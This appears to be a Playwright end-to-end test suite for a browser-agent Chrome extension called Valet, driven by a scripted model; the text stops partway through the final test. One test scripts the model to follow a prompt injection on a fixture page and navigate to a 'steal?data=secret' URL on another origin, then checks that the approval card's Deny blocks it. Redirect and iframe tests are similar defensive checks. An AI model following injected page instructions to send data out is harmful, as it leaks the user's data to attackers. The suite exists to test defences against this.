/**
 * The panel, end to end in Chromium: add a connection in the panel's
 * Settings, type a goal, and the agent — driven by a scripted model speaking
 * the OpenAI-compatible protocol — opens the fixture shop, searches, and
 * reports back in the panel.
 */
import { chromium, expect, test, type BrowserContext, type Page } from '@playwright/test';
import { mkdtemp, rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { buildExtension } from '../scripts/build.mjs';
import { EXTENSION_ID } from '../src/id.js';
import { refOf, startModel, type ScriptedModel } from './fixtures/model.js';
import { startFixture, type Fixture } from './fixtures/server.js';

const planter = fileURLToPath(new URL('fixtures/planter', import.meta.url));

// The tests hand state to one another (the connection, the skills, the pace): they run in order, and a failure stops the rest.
test.describe.configure({ mode: 'serial' });

let context: BrowserContext;
let fixture: Fixture;
let model: ScriptedModel;
let profile: string;

let dist: string;

test.beforeAll(async () => {
  // A build of its own: never the dist/ a dev loop may be serving.
  dist = await buildExtension({ out: await mkdtemp(path.join(os.tmpdir(), 'valet-e2e-dist-')) });
  fixture = await startFixture();
  model = await startModel([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shop` } }),
    ({ observation }) => ({ call: { action: 'fill', observation: observation!.id, target: { ref: refOf(observation, /searchbox|textbox/, /Search/) }, value: 'blue mug' } }),
    ({ observation }) => ({ call: { action: 'press', observation: observation!.id, target: { ref: refOf(observation, /searchbox|textbox/, /Search/) }, key: 'Enter' } }),
    ({ observation }) => ({ text: observation?.url.includes('/search') ? 'The blue mug costs $12.40.' : `Unexpected page: ${observation?.url}` }),
  ]);
  profile = await mkdtemp(path.join(os.tmpdir(), 'valet-e2e-'));
  context = await chromium.launchPersistentContext(profile, {
    channel: 'chromium',
    headless: !process.env['HEADFUL'],
    // A second extension stands in for a password manager (e2e/fixtures/planter): it plants a frame of its own in a page when a field is focused.
    args: [`--disable-extensions-except=${dist},${planter}`, `--load-extension=${dist},${planter}`,
      // Chrome's "Choose what to share" dialog picks the fixture shop by itself, as the owner would.
      '--auto-select-tab-capture-source-by-title=Fixture shop', '--auto-select-desktop-capture-source=Fixture shop'],
  });
  context.serviceWorkers()[0] ?? await context.waitForEvent('serviceworker');
});

test.afterAll(async () => {
  await context?.close();
  await fixture?.close();
  await model?.close();
  if (profile) await rm(profile, { recursive: true, force: true });
  if (dist) await rm(dist, { recursive: true, force: true });
});

async function openPanel(): Promise<Page> {
  const panel = await context.newPage();
  await panel.goto(`chrome-extension://${EXTENSION_ID}/panel.html`);
  return panel;
}

test('opens the welcome guide on install, where the model gets connected', async () => {
  const welcome = context.pages().find((page) => page.url().endsWith('/welcome.html')) ?? await context.waitForEvent('page', { predicate: (page) => page.url().endsWith('/welcome.html') });
  await welcome.bringToFront();
  await expect(welcome.getByRole('heading', { name: 'Welcome to Valet' })).toBeVisible();
  // Step 1 needs a real Chrome side panel; here it falls back to the hint.
  await welcome.getByRole('button', { name: 'Open the side panel' }).click();
  await expect(welcome.locator('#open-status')).toHaveText(/(Opened|Click the Valet icon)/);
  // Step 2 is the Settings sheet itself: no connection yet, so its form is open.
  await expect(welcome.locator('#ready')).toHaveText(/Once connected/);
  await welcome.getByLabel('Provider').selectOption('custom');
  await welcome.getByLabel('Server URL').fill(model.base);
  await welcome.getByRole('button', { name: 'Connect' }).click();
  await expect(welcome.locator('#ready')).toHaveText(/Connected. Now pick a model/);
  await welcome.locator('.connections select').selectOption('scripted');
  await expect(welcome.locator('#ready')).toHaveText(/Ready: .* scripted/);
  // Left as the next test expects it: no connection.
  await welcome.getByRole('button', { name: /^Remove / }).click();
  await expect(welcome.locator('.connections .empty-row')).toBeVisible();
  await welcome.getByRole('button', { name: /Done/ }).click();
  await expect.poll(() => context.pages().some((page) => page.url().endsWith('/welcome.html'))).toBe(false);
});

test('New conversation puts the cursor in the message box, from Settings too', async () => {
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'Settings' }).click();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await expect(panel.locator('#settings-view')).toBeHidden();
  await expect(panel.locator('#goal')).toBeFocused();
  await panel.close();
});

test('adds a connection in Settings and picks its model', async () => {
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'Settings' }).click();
  await expect(panel.locator('#chat-view')).toBeHidden();
  await expect(panel.getByLabel('Server URL')).toBeHidden();
  // With no connection yet, the form to add one is already open.
  await expect(panel.getByRole('button', { name: 'Add a connection' })).toBeHidden();
  await panel.getByLabel('Provider').selectOption('custom');
  await panel.getByLabel('Server URL').fill(model.base);
  await panel.getByRole('button', { name: 'Connect' }).click();
  await expect(panel.locator('#settings-status')).toHaveText(/Connected/);
  const models = panel.locator('.connections select');
  await expect(models.locator('option', { hasText: 'scripted' })).toHaveCount(1);
  await models.selectOption('scripted');
  if (process.env['SCREENSHOTS']) {
    // A realistic page: a second connection.
    await panel.getByRole('button', { name: 'Add a connection' }).click();
    await panel.getByLabel('Provider').selectOption('ollama-local');
    await panel.getByRole('button', { name: 'Connect' }).click();
    for (const scheme of ['dark', 'light'] as const) {
      await panel.emulateMedia({ colorScheme: scheme });
      await panel.reload();
      await panel.getByRole('button', { name: 'Settings' }).click();
      await panel.setViewportSize({ width: 380, height: 900 });
      await expect(panel.locator('.connections li')).toHaveCount(2);
      await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], `settings-${scheme}.png`), fullPage: true });
    }
    await panel.emulateMedia({ colorScheme: null });
    // Leave things as the next tests expect: the scripted model in use, no Ollama.
    await panel.getByRole('button', { name: 'Remove Ollama (local)' }).click();
    await panel.locator('.connections li', { hasText: 'scripted' }).locator('.dot').click();
    await expect(panel.locator('.connections li.active')).toContainText('scripted');
  }
  await panel.getByRole('button', { name: 'Back' }).click();
  await expect(panel.locator('#connection')).toHaveText(/scripted/);
  await panel.close();
});

test('offers Claude and ChatGPT subscription sign-in, with their network rules limited to the extension', async () => {
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'Settings' }).click();
  await panel.getByRole('button', { name: 'Add a connection' }).click();
  await panel.getByLabel('Provider').selectOption('claude-sub');
  await expect(panel.getByRole('button', { name: 'Sign in with Claude' })).toBeVisible();
  await expect(panel.locator('#claude-hint')).toBeVisible();
  await expect(panel.locator('#key-row')).toBeHidden();
  await panel.getByLabel('Provider').selectOption('chatgpt-sub');
  await expect(panel.getByRole('button', { name: 'Sign in with ChatGPT' })).toBeVisible();
  await expect(panel.locator('#chatgpt-hint')).toBeVisible();
  await panel.getByRole('button', { name: 'Back' }).click();
  await panel.close();

  const worker = context.serviceWorkers()[0]!;
  const rules = await worker.evaluate(() => ((globalThis as unknown as { chrome: unknown }).chrome as { declarativeNetRequest: { getSessionRules(): Promise<Array<{ id: number; condition: Record<string, unknown> }>> } })
    .declarativeNetRequest.getSessionRules());
  const provider = rules.filter((rule) => rule.id >= 9001 && rule.id <= 9010);
  expect(provider).toHaveLength(4);
  for (const rule of provider) expect(rule.condition).toMatchObject({ tabIds: [-1], initiatorDomains: [EXTENSION_ID] });
});

test('runs a goal from the panel: the agent searches the shop and answers', async () => {
  const panel = await openPanel();
  // The panel page itself is the active tab and is not a web page, so the agent opens its own tab.
  await expect(panel.locator('#tab-title')).toHaveText('Its own tab');
  await expect(panel.locator('#where')).toHaveAttribute('data-tip', /cannot be used/);
  await panel.locator('#goal').fill('Find the price of the blue mug in the fixture shop');
  await panel.getByRole('button', { name: 'Send' }).click();
  // The fixture shop is a new site for this run: the agent asks first.
  await expect(panel.locator('#card-text')).toContainText(`The agent wants to open ${fixture.main}`);
  await panel.getByRole('button', { name: 'Allow once' }).click();
  if (process.env['SCREENSHOTS']) {
    await expect(panel.locator('.status.working .spinner')).toBeVisible({ timeout: 15_000 });
    await panel.setViewportSize({ width: 380, height: 640 });
    await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'working.png') });
  }
  // Enter in the search box submits a form (GET /search): that needs approval too.
  await expect(panel.locator('#card-text')).toContainText(`Submit this form ("Search") to ${fixture.main}/search (GET)`, { timeout: 30_000 });
  await expect(panel.locator('#card-text')).toContainText('blue mug');
  await panel.getByRole('button', { name: 'Allow once' }).click();

  await expect(panel.locator('.agent').last()).toHaveText('The blue mug costs $12.40.', { timeout: 30_000 });
  await expect(panel.locator('.action')).toHaveText([`Opened ${fixture.main}/shop`, /^Typed into (search|text)box "Search"$/, /^Pressed Enter on (search|text)box "Search"$/]);
  // The three steps fold into one line: how many, and the latest.
  await expect(panel.locator('.activity > details > summary')).toHaveText(/^3 steps\s*Pressed Enter on (search|text)box "Search"$/);
  await expect(panel.locator('.activity .action').first()).toBeHidden();
  if (process.env['SCREENSHOTS']) await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'folded.png') });
  await panel.locator('.activity > details > summary').click();
  await expect(panel.locator('.activity .action').first()).toBeVisible();
  await expect(panel.locator('.owner')).toHaveText(['Find the price of the blue mug in the fixture shop']);
  // Only one view at a time, and no controls that do not apply.
  await expect(panel.locator('#settings-view')).toBeHidden();
  // After the run, the next message continues in the agent's tab (or goes to a new one).
  await expect(panel.locator('#where')).toHaveAttribute('data-tip', /^Will continue in: /);
  await expect(panel.locator('#where')).toBeEnabled();
  expect(fixture.requests.main).toContain('GET /search?q=blue+mug');

  // Local model servers (Ollama refuses unknown Origins) get the extension's requests without one.
  expect(model.origins.length).toBeGreaterThan(0);
  expect(model.origins.filter(Boolean)).toEqual([]);
  const first = model.requests[0]!;
  expect(first.tools).toHaveLength(4);
  expect((first as Record<string, unknown>)['parallel_tool_calls']).toBe(false);
  // Every tool call was answered before the next model turn.
  const last = model.requests.at(-1)!.messages;
  const calls = last.filter((message) => message.role === 'assistant' && message.tool_calls).length;
  expect(last.filter((message) => message.role === 'tool')).toHaveLength(calls);
  if (process.env['SCREENSHOTS']) {
    await panel.setViewportSize({ width: 380, height: 640 });
    await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'panel-run.png') });
    await panel.getByRole('button', { name: 'Settings' }).click();
    await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'panel-settings.png') });
  }
  await panel.close();
});

/** The pixel at the centre of the partner widget, in the screenshot the panel shows, is the mask's grey. */
async function expectGreyOverWidget(thumb: ReturnType<Page['locator']>, pageUrl: string): Promise<void> {
  const shop = context.pages().find((page) => page.url().startsWith(pageUrl))!;
  // The shadow fixture exposes its widget's box itself: a closed shadow root hides it from everyone else.
  const box = await shop.evaluate(() => {
    const exposed = (window as unknown as { widgetBox?: () => DOMRect }).widgetBox;
    const rect = exposed ? exposed() : document.querySelector('iframe')?.getBoundingClientRect();
    return rect ? { x: rect.x, y: rect.y, width: rect.width, height: rect.height, viewport: innerWidth } : null;
  });
  expect(box).not.toBeNull();
  const pixel = await thumb.evaluate((image: HTMLImageElement, at: { x: number; y: number; viewport: number }) => {
    const canvas = document.createElement('canvas');
    canvas.width = image.naturalWidth;
    canvas.height = image.naturalHeight;
    const context = canvas.getContext('2d')!;
    context.drawImage(image, 0, 0);
    const k = image.naturalWidth / at.viewport;
    return [...context.getImageData(Math.round(at.x * k), Math.round(at.y * k), 1, 1).data.slice(0, 3)];
  }, { x: box!.x + box!.width / 2, y: box!.y + box!.height / 2, viewport: box!.viewport });
  for (const [channel, grey] of pixel.map((value, i) => [value, [0x8a, 0x8f, 0x98][i]!])) expect(Math.abs(channel! - grey!)).toBeLessThan(12);
}

/** Run one goal from a fresh conversation; returns the panel. */
async function runGoal(goal: string): Promise<Page> {
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await panel.locator('#goal').fill(goal);
  await panel.getByRole('button', { name: 'Send' }).click();
  return panel;
}

test('chooses where the agent works from a small menu next to the composer', async () => {
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  const shop = await context.newPage();
  try {
    await shop.goto(`${fixture.main}/shop`);
    await shop.bringToFront();
    // Its name is the sentence shown on hover, so a screen reader hears where the agent will work.
    const where = panel.getByRole('button', { name: /^Will work in this tab: Fixture shop/ });
    await expect(where).toBeEnabled();
    await where.click();
    await expect(panel.getByRole('menuitemradio', { name: /This tab/ })).toHaveAttribute('aria-checked', 'true');
    if (process.env['SCREENSHOTS']) {
      await panel.setViewportSize({ width: 380, height: 420 });
      await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'where-menu.png') });
    }
    await panel.getByRole('menuitemradio', { name: /A new tab/ }).click();
    await expect(panel.locator('#where-menu')).toBeHidden();
    await expect(panel.locator('#tab-title')).toHaveText('A new tab');
    await panel.locator('#where').click();
    await expect(panel.getByRole('menuitemradio', { name: /A new tab/ })).toHaveAttribute('aria-checked', 'true');
    await panel.keyboard.press('Escape');
    await expect(panel.locator('#where-menu')).toBeHidden();
  } finally {
    await shop.close();
    await panel.close();
  }
});

test('an injected instruction to go elsewhere gets a card, and Deny sends nothing there', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/inject` } }),
    // The model obeys the page (the attack), aiming data at the other origin.
    () => ({ call: { action: 'navigate', url: `${fixture.other}/steal?data=secret` } }),
    ({ messages }) => ({ text: String(messages.at(-1)?.content ?? '').includes('did not allow') ? 'I was not allowed to go there.' : 'went there' }),
  ]);
  const before = fixture.requests.other.length;
  const panel = await runGoal('Read the reviews');
  await panel.getByRole('button', { name: 'Allow once' }).click(); // the fixture shop itself
  await expect(panel.locator('#card-text')).toContainText(`The agent wants to open ${fixture.other}`);
  await panel.getByRole('button', { name: 'Deny' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('I was not allowed to go there.', { timeout: 30_000 });
  expect(fixture.requests.other.slice(before).filter((line) => line.includes('/steal'))).toEqual([]);
  await panel.close();
});

test('a redirect to an unapproved site is blocked before the request leaves, and the submit is not repeated', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/checkout` } }),
    ({ observation }) => ({ call: { action: 'fill', observation: observation!.id, target: { ref: refOf(observation, /textbox/, /Name/) }, value: 'Amen' } }),
    ({ observation }) => ({ call: { action: 'click', observation: observation!.id, target: { ref: refOf(observation, /button/, /Pay/) } } }),
    ({ messages }) => ({ text: String(messages.at(-1)?.content ?? '').includes('nothing was sent there') ? 'The redirect was blocked.' : 'no block seen' }),
  ]);
  const before = { main: fixture.requests.main.length, other: fixture.requests.other.length };
  const panel = await runGoal('Pay');
  await panel.getByRole('button', { name: 'Allow once' }).click(); // the fixture shop
  await expect(panel.locator('#card-text')).toContainText(`Submit this form ("Pay") to ${fixture.main}/pay (POST)`, { timeout: 30_000 });
  await panel.getByRole('button', { name: 'Allow once' }).click(); // the submission itself
  await expect(panel.locator('#card-text')).toContainText(`A page tried to send the agent to ${fixture.other}`, { timeout: 30_000 });
  await panel.getByRole('button', { name: 'Deny' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('The redirect was blocked.', { timeout: 30_000 });
  expect(fixture.requests.other.slice(before.other)).toEqual([]);
  // The approved site got the form post exactly once.
  expect(fixture.requests.main.slice(before.main).filter((line) => line === 'POST /pay')).toHaveLength(1);
  await panel.close();
});

test('text from an unapproved iframe never reaches the model', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shop` } }),
    () => ({ text: 'Looked at the shop.' }),
  ]);
  const panel = await runGoal('Look at the shop');
  await panel.getByRole('button', { name: 'Allow once' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Looked at the shop.', { timeout: 30_000 });
  const sent = JSON.stringify(model.requests);
  expect(sent).toContain('Blue mug');
  expect(sent).toContain('origin not approved');
  expect(sent).not.toContain('Partner offer');
  await panel.close();
});

test('takes a screenshot with the unapproved frame painted over, and makes a file the owner downloads', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shop` } }),
    () => ({ call: { action: 'screenshot' } }),
    () => ({ tool: 'save_file', call: { filename: 'shop-notes.md', content: '# Shop\n\nBlue mug: $12.40' } }),
    () => ({ text: 'Here are your notes.' }),
  ]);
  const panel = await runGoal('Screenshot the shop and save notes');
  await panel.getByRole('button', { name: 'Allow once' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Here are your notes.', { timeout: 30_000 });

  // The model got the image (Chat Completions carries it in a user message after the tool result).
  expect(JSON.stringify(model.requests.at(-1)!.messages)).toContain('data:image/jpeg;base64,');

  // The thumbnail is under the step; the partner widget (another, unapproved site) is grey in it.
  const thumb = panel.locator('.step .shot img');
  await expect(thumb).toHaveCount(1);
  await expect.poll(() => thumb.evaluate((image: HTMLImageElement) => image.naturalWidth)).toBeGreaterThan(0);
  await expectGreyOverWidget(thumb, `${fixture.main}/shop`);

  // Click opens it large, in a window of its own beside the browser.
  const [viewer] = await Promise.all([context.waitForEvent('page'), panel.locator('.step .shot').click()]);
  await expect(viewer).toHaveURL(/viewer\.html\?id=shot-/);
  await expect.poll(() => viewer.locator('#image').evaluate((image: HTMLImageElement) => image.naturalWidth)).toBeGreaterThan(0);
  await expect(viewer.getByRole('button', { name: 'Download' })).toBeVisible();
  if (process.env['SCREENSHOTS']) {
    await viewer.setViewportSize({ width: 900, height: 620 });
    await viewer.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'viewer.png') });
  }
  await expect(panel.locator('#lightbox')).toBeHidden();
  await viewer.close();

  // The file: a chip with Download; the click is the download.
  await expect(panel.locator('.file .name')).toContainText('shop-notes.md');
  const [download] = await Promise.all([panel.waitForEvent('download'), panel.locator('.file').getByRole('button', { name: 'Download' }).click()]);
  expect(download.suggestedFilename()).toBe('shop-notes.md');
  const { readFile } = await import('node:fs/promises');
  expect(await readFile((await download.path())!, 'utf8')).toBe('# Shop\n\nBlue mug: $12.40');
  await panel.close();
});

test('makes a PDF: Chrome prints the agent\'s Markdown in a window of its own, and the download is a real PDF', async () => {
  model.script([
    () => ({ tool: 'save_file', call: { filename: 'shop-report.pdf', content: '# Shop report\n\n## Prices\n\n| Item | Price |\n| --- | --- |\n| Blue mug | $12.40 |\n\nNotes — café, 日本語, 🙂.' } }),
    () => ({ text: 'Here is your report.' }),
  ]);
  const panel = await runGoal('Write a PDF report');
  await expect(panel.locator('.agent').last()).toHaveText('Here is your report.', { timeout: 30_000 });
  // The model was told the PDF was made, not that it fell back to Markdown.
  const answer = model.requests.at(-1)!.messages.find((message) => message.role === 'tool')!;
  expect(String(answer.content)).toContain('"saved":"shop-report.pdf"');
  // The window Chrome printed in is closed again.
  expect(context.pages().map((page) => page.url()).filter((url) => url.includes('document.html'))).toEqual([]);
  await expect(panel.locator('.file .name')).toContainText('shop-report.pdf');
  const [download] = await Promise.all([panel.waitForEvent('download'), panel.locator('.file').getByRole('button', { name: 'Download' }).click()]);
  expect(download.suggestedFilename()).toBe('shop-report.pdf');
  const { readFile } = await import('node:fs/promises');
  const bytes = await readFile((await download.path())!);
  expect(bytes.subarray(0, 5).toString('ascii')).toBe('%PDF-');
  expect(bytes.length).toBeGreaterThan(1_000);
  if (process.env['SCREENSHOTS']) await download.saveAs(path.join(process.env['SCREENSHOTS'], 'report.pdf'));
  await panel.close();
});

test('paints over an unapproved frame hidden in a closed shadow root', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shadow` } }),
    () => ({ call: { action: 'screenshot' } }),
    () => ({ text: 'Took it.' }),
  ]);
  const panel = await runGoal('Screenshot the shadow shop');
  await panel.getByRole('button', { name: 'Allow once' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Took it.', { timeout: 30_000 });
  const thumb = panel.locator('.step .shot img');
  await expect(thumb).toHaveCount(1);
  await expect.poll(() => thumb.evaluate((image: HTMLImageElement) => image.naturalWidth)).toBeGreaterThan(0);
  await expectGreyOverWidget(thumb, `${fixture.main}/shadow`);
  await panel.close();
});

test('sends attached files and a screenshot of another tab with the owner\'s message', async () => {
  // A 2×2 red PNG, a one-page PDF header and a text file.
  const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAAFklEQVR4nGP8z8DAwMDAxMDAwMDAAAANHQEDasKb6QAAAABJRU5ErkJggg==', 'base64');
  const pdf = Buffer.from('%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n');
  model.script([
    ({ messages }) => {
      const sent = JSON.stringify(messages);
      const seen = [sent.includes('data:image/jpeg;base64,'), sent.includes('"type":"file"') && sent.includes('report.pdf'), sent.includes('buy a blue mug')];
      return { text: seen.every(Boolean) ? 'Got all three.' : `Missing: ${JSON.stringify(seen)}` };
    },
    ({ messages }) => ({ text: JSON.stringify(messages).split('data:image/jpeg;base64,').length > 2 ? 'Got the tab screenshot.' : 'No screenshot.' }),
  ]);
  const shop = await context.newPage();
  await shop.goto(`${fixture.main}/shop`);
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await expect(panel.getByRole('button', { name: 'Dictate' })).toBeVisible();

  await panel.locator('#file-input').setInputFiles([
    { name: 'dot.png', mimeType: 'image/png', buffer: png },
    { name: 'report.pdf', mimeType: 'application/pdf', buffer: pdf },
    { name: 'notes.txt', mimeType: 'text/plain', buffer: Buffer.from('Remember to buy a blue mug.') },
  ]);
  await expect(panel.locator('.pending')).toHaveCount(3);
  await expect(panel.locator('.pending.image img')).toHaveCount(1);
  // A picture not sent yet opens the same way; its temporary copy goes when the window closes.
  const [preview] = await Promise.all([context.waitForEvent('page'), panel.getByRole('button', { name: 'Open dot.png' }).click()]);
  await expect(preview).toHaveURL(/viewer\.html\?id=view-.*temporary=1/);
  await expect.poll(() => preview.locator('#image').evaluate((image: HTMLImageElement) => image.naturalWidth)).toBeGreaterThan(0);
  const temp = new URL(preview.url()).searchParams.get('id')!;
  await preview.close();
  await expect.poll(() => panel.evaluate(async (key) => Object.keys(await (globalThis as unknown as { chrome: { storage: { session: { get(k: string): Promise<object> } } } }).chrome.storage.session.get(key)).length, `agent:media:${temp}`)).toBe(0);
  await expect(panel.locator('.pending')).toHaveCount(3);
  await panel.getByRole('button', { name: 'Remove notes.txt' }).click();
  await expect(panel.locator('.pending')).toHaveCount(2);
  await panel.locator('#file-input').setInputFiles([{ name: 'notes.txt', mimeType: 'text/plain', buffer: Buffer.from('Remember to buy a blue mug.') }]);
  await panel.locator('#goal').fill('What did I attach?');
  if (process.env['SCREENSHOTS']) {
    await panel.setViewportSize({ width: 380, height: 640 });
    await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'composer-attachments.png') });
  }
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Got all three.', { timeout: 30_000 });
  await expect(panel.locator('.pending')).toHaveCount(0);
  // The owner's message shows the image from storage and the other files by name.
  const bubble = panel.locator('.owner').last();
  await expect.poll(() => bubble.locator('img').evaluate((image: HTMLImageElement) => image.naturalWidth)).toBeGreaterThan(0);
  await expect(bubble.locator('.chip-file')).toHaveText([/PDFreport\.pdf/, /TXTnotes\.txt/]);

  // A screenshot of another tab — in the background — through Chrome's own share dialog.
  await panel.getByRole('button', { name: 'Add to the message' }).click();
  await panel.getByRole('menuitem', { name: /Screenshot/ }).click();
  await expect(panel.locator('.pending.image')).toHaveCount(1, { timeout: 15_000 });
  await expect(panel.locator('.pending.image')).toHaveAttribute('title', /^Screenshot of a tab/);
  // Not a blank frame: the picture has content (the shop's heading and form).
  const spread = await panel.locator('.pending.image img').evaluate(async (image: HTMLImageElement) => {
    await image.decode();
    const canvas = document.createElement('canvas');
    canvas.width = image.naturalWidth;
    canvas.height = image.naturalHeight;
    const context = canvas.getContext('2d')!;
    context.drawImage(image, 0, 0);
    const data = context.getImageData(0, 0, canvas.width, canvas.height).data;
    let min = 255, max = 0;
    for (let i = 0; i < data.length; i += 4) { const v = data[i]!; if (v < min) min = v; if (v > max) max = v; }
    return max - min;
  });
  expect(spread).toBeGreaterThan(100);
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Got the tab screenshot.', { timeout: 30_000 });

  // Too large together: refused in the panel, and the draft stays.
  const big = Buffer.alloc(1_600_000, 0x20);
  await panel.locator('#file-input').setInputFiles([
    { name: 'a.pdf', mimeType: 'application/pdf', buffer: big },
    { name: 'b.pdf', mimeType: 'application/pdf', buffer: big },
  ]);
  await expect(panel.locator('.pending')).toHaveCount(2);
  await panel.locator('#goal').fill('Compare these');
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('#composer-error')).toHaveText(/too large together/);
  await expect(panel.locator('#goal')).toHaveValue('Compare these');
  await expect(panel.locator('.pending')).toHaveCount(2);
  if (process.env['SCREENSHOTS']) await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'composer-sent.png') });
  await shop.close();
  await panel.close();
});

test('pace: suggesting fields get real key presses; Natural in Settings types every field key by key', async () => {
  const plan = () => [
    () => ({ call: { action: 'navigate', url: `${fixture.main}/suggest` } }),
    ({ observation }: { observation?: Parameters<typeof refOf>[0] }) => ({ call: { action: 'fill', observation: observation!.id, target: { ref: refOf(observation, /combobox/, /City/) }, value: 'Lomé' } }),
    ({ observation }: { observation?: Parameters<typeof refOf>[0] }) => ({ call: { action: 'fill', observation: observation!.id, target: { ref: refOf(observation, /textbox/, /Notes/) }, value: 'hi' } }),
    () => ({ text: 'Filled.' }),
  ];
  const keysOn = async () => {
    const page = context.pages().find((candidate) => candidate.url().startsWith(`${fixture.main}/suggest`))!;
    const counts = await page.evaluate(() => (window as unknown as { keys: { city: number; notes: number } }).keys);
    await page.close();
    return counts;
  };

  // Fast (the default): the suggesting field key by key, the plain one at once.
  model.script(plan());
  let panel = await runGoal('Fill the form');
  await panel.getByRole('button', { name: 'Allow once' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Filled.', { timeout: 30_000 });
  expect(await keysOn()).toEqual({ city: 4, notes: 0 });
  await panel.close();

  // Natural: every field key by key.
  panel = await openPanel();
  await panel.getByRole('button', { name: 'Settings' }).click();
  await panel.getByRole('radio', { name: /Natural/ }).check();
  await panel.getByRole('button', { name: 'Back' }).click();
  await panel.close();
  model.script(plan());
  panel = await runGoal('Fill the form again');
  await panel.getByRole('button', { name: 'Allow once' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Filled.', { timeout: 30_000 });
  expect(await keysOn()).toEqual({ city: 4, notes: 2 });

  // Back to Fast for the tests after this one.
  await panel.getByRole('button', { name: 'Settings' }).click();
  await panel.getByRole('radio', { name: /Fast/ }).check();
  await panel.close();
});

test('a follow-up continues where the conversation is, not in the tab the owner is looking at', async () => {
  model.script([
    () => ({ text: 'First done.' }),
    ({ messages }) => ({ text: String(messages.filter((message) => message.role === 'user').at(-1)?.content ?? '') }),
  ]);
  const shop = await context.newPage();
  await shop.goto(`${fixture.main}/shop`);
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await shop.bringToFront();
  await expect(panel.locator('#tab-title')).toHaveText('Fixture shop');
  await expect(panel.locator('#where')).toHaveAttribute('data-tip', /^Will work in this tab: Fixture shop/);
  await expect(panel.locator('#where')).toHaveClass(/hand/);
  await panel.locator('#goal').fill('Start here');
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('First done.', { timeout: 30_000 });

  // The owner moves to another page; the follow-up still goes to the shop.
  const other = await context.newPage();
  await other.goto(`${fixture.main}/inject`);
  await other.bringToFront();
  await expect(panel.locator('#tab-title')).toHaveText('Fixture shop');
  await expect(panel.locator('#where')).toHaveAttribute('data-tip', /^Will continue in: Fixture shop/);
  await expect(panel.locator('#where')).not.toHaveClass(/hand/);
  await panel.locator('#where').click();
  await expect(panel.getByRole('menuitemradio', { name: /Continue where it is/ })).toHaveAttribute('aria-checked', 'true');
  await expect(panel.getByRole('menuitemradio', { name: /This tab/ })).toContainText('Customer reviews');
  await panel.keyboard.press('Escape');
  await panel.locator('#goal').fill('Follow up');
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('.agent').last()).toContainText('Continue in the tab you are working in: "Fixture shop"', { timeout: 30_000 });
  await other.close();
  await shop.close();
  await panel.close();
});

test('takes a screenshot of the handed tab as its very first action', async () => {
  model.script([
    () => ({ call: { action: 'screenshot' } }),
    ({ messages }) => ({ text: `RESULT ${JSON.stringify(messages.filter((message) => message.role === 'tool').map((message) => message.content))}` }),
  ]);
  const shop = await context.newPage();
  await shop.goto(`${fixture.main}/shop`);
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await shop.bringToFront();
  await expect(panel.locator('#tab-title')).toHaveText('Fixture shop');
  await panel.locator('#goal').fill('Can you take a screenshot?');
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('.agent').last()).toContainText('RESULT', { timeout: 30_000 });
  const text = await panel.locator('.agent').last().textContent();
  expect(text).not.toContain('refused');
  await expect(panel.locator('.action')).toHaveText(['Took a screenshot']);
  await shop.close();
  await panel.close();
});

test('approvals last for the conversation; Auto approves sites, never a form that sends data, and carries over', async () => {
  test.slow(); // four runs in one test
  const plan = () => [
    () => ({ call: { action: 'navigate', url: `${fixture.main}/order` } }),
    ({ observation }: { observation?: Parameters<typeof refOf>[0] }) => ({ call: { action: 'fill', observation: observation!.id, target: { ref: refOf(observation, /textbox/, /Customer name/) }, value: 'Test User' } }),
    ({ observation }: { observation?: Parameters<typeof refOf>[0] }) => ({ call: { action: 'click', observation: observation!.id, target: { ref: refOf(observation, /button/, /Submit order/) } } }),
    ({ messages }: { messages: Array<{ content?: string | null }> }) => ({ text: String(messages.at(-1)?.content ?? '').includes('did not allow this form') ? 'Not submitted.' : 'Submitted.' }),
  ];
  const posts = () => fixture.requests.main.filter((line) => line === 'POST /post').length;
  const start = posts();

  // 1. Allow once: nothing is sent before the answer, exactly one POST after.
  model.script(plan());
  const panel = await runGoal('Order');
